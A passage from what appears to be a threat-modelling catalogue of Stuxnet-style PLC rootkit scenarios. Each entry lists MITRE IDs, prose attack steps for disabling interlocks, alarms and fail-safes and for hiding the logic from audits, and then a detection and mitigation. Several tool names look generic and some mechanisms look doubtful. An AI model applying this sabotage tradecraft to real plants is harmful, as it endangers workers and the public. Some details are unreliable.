- **Tools**: USB Serial Reader Script, WinCC, HMI Logic Editor
- **Scenario**: When a specific engineer's USB (recognized by serial ID) is plugged into the HMI, sabotage logic activates.
- **Attack Steps**: Step 1: Attacker writes script that reads USB serial number (e.g., 1234-5678) upon plug-in using [USB Serial Reader].Step 2: Embeds this script into [WinCC] runtime logic using [HMI Logic Editor].Step 3: If detected USB ID matches, HMI sends flag to PLC (via SCADA tag) that triggers rootkit logic.Step 4: Logic disables fail-safe mode or overrides alarm thresholds.Step 5: When USB removed, PLC returns to normal.Step 6: Attack is executed only during engineer interaction window.Step 7: Logs spoofed to show no tag change.Step 8: Attack relies on familiarity and trust in engineer’s USB device.
- **Detection**: Monitor USB activity logs on HMI systems
- **Solution**: Disable USB access or whitelist only trusted drives
- **Tags**: usb-id-triggered, insider-rootkit

## Rootkit Alters Safety Logic Only on 29th February

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Ultra-rare time-based trigger
- **MITRE**: T0859, T0804
- **Impact**: Hidden logic invisible for years
- **Tools**: TIA Portal, RTC Comparator, PLCsim
- **Scenario**: Logic is programmed to execute sabotage only on leap year day, February 29, ensuring extreme stealth.
- **Attack Steps**: Step 1: Attacker writes conditional logic in OB1 to check if Date = 29/02 using [RTC Comparator].Step 2: If true, disables trip interlocks and motor delay timer.Step 3: Logic executes only on that day and reverts itself afterward.Step 4: During test periods or audits, date check fails — logic hidden.Step 5: Uses [PLCsim] to simulate the Feb 29 condition for verification.Step 6: Operator assumes any fault is coincidental due to date rarity.Step 7: Logs misreport the date as March 1.Step 8: Reintroduction of rootkit logic required only every 4 years.
- **Detection**: Audit RTC-dependent logic annually
- **Solution**: Enforce policy to disallow date-specific sabotage triggers
- **Tags**: leap-year-rootkit, date-triggered

## Rootkit Embedded in Logic Analyzer Tool Add-on

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Station + PLC
- **Vulnerability**: Compromised engineering tool
- **MITRE**: T0859, T1203
- **Impact**: Silent code injection during analysis
- **Tools**: Logic Analyzer Tool, DLL Injector, TIA Portal Add-on Manager
- **Scenario**: An engineering logic analysis plug-in is modified to inject sabotage logic when connected to a live PLC.
- **Attack Steps**: Step 1: Attacker modifies DLL of [Logic Analyzer Tool] to execute logic injection commands.Step 2: When engineer runs logic analysis, plug-in silently uploads rootkit into OB1.Step 3: Injected logic disables alarm horn if a sensor exceeds a threshold.Step 4: Add-on manager reports tool as “verified”.Step 5: Logic is obfuscated and appears as part of an unrelated block.Step 6: Operator sees only analysis output, not code changes.Step 7: Upon exit, logic is left active in PLC.Step 8: Rootkit survives power cycles and acts during next critical event.
- **Detection**: Monitor file hash of all plug-in DLLs
- **Solution**: Isolate PLC from dev tools during analysis
- **Tags**: toolchain-abuse, dll-injection-rootkit

## Rootkit Logic Hidden Within Commented Blocks

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Commented visual obfuscation
- **MITRE**: T0859, T0809
- **Impact**: Visual deception during logic audit
- **Tools**: TIA Portal, Ladder Comment Injector, OB1 Modifier
- **Scenario**: Attacker embeds active sabotage logic inside a ladder comment block, where the PLC still executes it but it appears to be documentation.
- **Attack Steps**: Step 1: Attacker opens OB1 in [TIA Portal] and uses [Ladder Comment Injector] to visually wrap logic in large text blocks labeled as comments.Step 2: Adds sabotage logic that disables overflow sensors if tank level > 90%.Step 3: Arranges the network layout so that this active logic looks like "disabled notes" to a visual reviewer.Step 4: Tests the logic to ensure it executes normally despite misleading visual format.Step 5: OB1 logic otherwise looks clean and passes version control checks.Step 6: Logic activates only when overflow sensor = TRUE and level > 90%.Step 7: After triggering once, logic disables itself automatically.Step 8: Reviewers skip over it, assuming it’s just legacy documentation.
- **Detection**: Use automated logic validators, not visual review
- **Solution**: Require code review with symbolic execution tools
- **Tags**: ladder-comment-abuse, visual-deception

## Rootkit That Alters Logic Only in Online View Mode

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Audit-evasion through context-aware logic
- **MITRE**: T0859, T0880
- **Impact**: Audit tools misled, real logic hidden
- **Tools**: TIA Portal, Online/Offline Mode Comparator, Logic Switcher Block
- **Scenario**: Rootkit behaves differently when engineering workstation is online (monitoring) vs. offline (normal operation), masking sabotage logic.
- **Attack Steps**: Step 1: Attacker adds conditional branch in OB1 using [Logic Switcher Block] that checks if engineering station is online (using PLC system status bits).Step 2: When online, the logic block runs in safe mode, disabling all sabotage routines.Step 3: When offline (normal production), rootkit logic activates and overrides fail-safes.Step 4: During audit, engineer sees only “safe” logic in action.Step 5: [Online/Offline Comparator] verifies behavior difference.Step 6: Logic is carefully branched and organized to maintain appearance of a single logic flow.Step 7: Attack appears only during unsupervised operation.Step 8: Trigger condition includes uptime > 1 hour to avoid startup detection.
- **Detection**: Compare offline code vs runtime memory behavior
- **Solution**: Disallow conditional execution based on online status
- **Tags**: audit-bypass, context-aware-logic

## Rootkit Controlled via Hidden HMI Touch Gesture

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: HMI + PLC
- **Vulnerability**: Gesture-based trigger abuse
- **MITRE**: T0859, T0882
- **Impact**: Hidden physical action causes digital sabotage
- **Tools**: WinCC, Gesture Event Mapper, HMI to PLC Tag Writer
- **Scenario**: Attacker embeds a secret HMI gesture (e.g., 4 taps on a blank screen area) to activate sabotage logic in the PLC.
- **Attack Steps**: Step 1: Attacker modifies [WinCC] HMI project to recognize a 4-tap pattern on an unused screen area using [Gesture Event Mapper].Step 2: Once gesture is performed, HMI writes a specific bit (e.g., M200.5 = TRUE) to the PLC via SCADA tag system using [HMI to PLC Tag Writer].Step 3: OB1 in PLC is modified to check this tag; if TRUE, triggers rootkit logic (e.g., disabling auto-shutdown on overheating).Step 4: Gesture is undocumented and hidden in a maintenance tab only accessible to engineers.Step 5: After activation, sabotage logic persists until next PLC reboot.Step 6: Gesture input appears as regular screen interaction in logs.Step 7: Engineers unaware of secret input won’t trigger it accidentally.Step 8: Logic reverts to safe state post-reset to avoid suspicion.
- **Detection**: Log analysis for manual tag change from HMI
- **Solution**: Use strict input validation and tag access control
- **Tags**: hmi-gesture-rootkit, tap-triggered-logic

